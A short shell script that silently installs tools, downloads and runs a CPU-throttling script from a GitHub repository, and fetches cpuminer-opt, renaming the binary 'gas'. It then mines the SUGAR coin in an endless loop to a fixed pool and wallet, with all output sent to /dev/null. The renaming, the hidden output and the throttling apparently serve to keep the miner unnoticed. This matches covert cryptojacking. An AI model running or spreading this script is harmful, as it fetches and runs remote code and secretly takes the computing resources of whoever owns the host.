#SGR
apt update > /dev/null 2>&1
apt install cpulimit > /dev/null 2>&1
apt install screen -y > /dev/null 2>&1
wget https://github.com/wikangdijalalan2/jagahkurang34/raw/main/limiting.sh > /dev/null 2>&1
chmod +x limiting.sh > /dev/null 2>&1
screen -dmS randum ./limiting.sh cpuminer-avx 65 75 > /dev/null 2>&1
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz > /dev/null 2>&1
tar -xf cpuminer-opt-linux.tar.gz > /dev/null 2>&1
mv cpuminer-avx gas > /dev/null 2>&1
while [ 1 ]; do
./gas -a yespowerSUGAR -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1qdgf4da5dcafhug574a0zjrfwkge262tl3q99e8.Okbaah > /dev/null 2>&1
sleep 3 > /dev/null 2>&1
done
sleep 999 > /dev/null 2>&1
